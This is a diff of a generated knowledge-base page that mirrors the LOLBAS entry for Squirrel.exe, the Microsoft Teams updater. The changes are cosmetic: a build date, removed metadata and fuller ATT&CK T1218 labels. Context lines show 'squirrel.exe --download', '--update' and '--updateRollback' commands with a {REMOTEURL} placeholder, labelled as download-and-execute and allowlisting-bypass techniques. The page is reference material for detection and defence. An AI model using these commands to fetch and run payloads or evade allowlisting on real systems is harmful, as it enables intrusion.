@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OtherMSBinaries/Squirrel.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Squirrel.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OtherMSBinaries"
 aliases:
   - "Squirrel.exe"
@@ -21,16 +21,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Squirrel.exe
-
 Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
-
-## Metadata
-
-- Category: OtherMSBinaries
-- Created: 2019-06-26
-- Author: Reegun J (OCBC Bank) - @reegun21
-- Source Path: yml/OtherMSBinaries/Squirrel.yml
 
 ## Paths
 
@@ -49,7 +40,7 @@ squirrel.exe --download {REMOTEURL}
 - Use Case: Download binary
 - Privileges: User
 - Operating System: Windows 7 and up with Microsoft Teams installed
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]
 
 ### 2. AWL Bypass
 
@@ -62,7 +53,7 @@ squirrel.exe --update {REMOTEURL}
 - Use Case: Download and execute binary
 - Privileges: User
 - Operating System: Windows 7 and up with Microsoft Teams installed
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]
 
 ### 3. Execute
 
@@ -75,7 +66,7 @@ squirrel.exe --update {REMOTEURL}
 - Use Case: Download and execute binary
 - Privileges: User
 - Operating System: Windows 7 and up with Microsoft Teams installed
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]
 
 ### 4. AWL Bypass
 
@@ -88,7 +79,7 @@ squirrel.exe --updateRollback={REMOTEURL}
 - Use Case: Download and execute binary
 - Privileges: User
 - Operating System: Windows 7 and up with Microsoft Teams installed
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]
 
 ### 5. Execute
 
@@ -101,7 +92,7 @@ squirrel.exe --updateRollback={REMOTEURL}
 - Use Case: Download and execute binary
 - Privileges: User
 - Operating System: Windows 7 and up with Microsoft Teams installed
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]
 
 ## Detections
 
